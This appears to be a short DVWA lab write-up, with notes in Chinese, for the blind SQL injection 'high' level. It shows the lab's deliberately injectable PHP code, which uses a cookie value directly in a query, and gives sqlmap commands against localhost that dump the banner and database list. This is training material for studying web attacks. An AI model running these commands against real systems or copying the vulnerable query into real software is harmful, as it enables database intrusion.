# SQL Injection (Blind) - High

## View Source

```PHP
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

## Code Review

- 同 *SQL Injection High Level*

## Answer

- 需要跳轉頁面

### Example

```
sqlmap -u "127.0.0.1/vulnerabilities/sqli_blind/cookie-input.php#" --data="id=1&Submit=Submit" --second-url="http://127.0.0.1/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=t8cp4e35u05g9gnd8dqt4emp23; security=high" --batch --banner
sqlmap -u "127.0.0.1/vulnerabilities/sqli_blind/cookie-input.php#" --data="id=1&Submit=Submit" --second-url="http://127.0.0.1/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=t8cp4e35u05g9gnd8dqt4emp23; security=high" --batch --dbs
```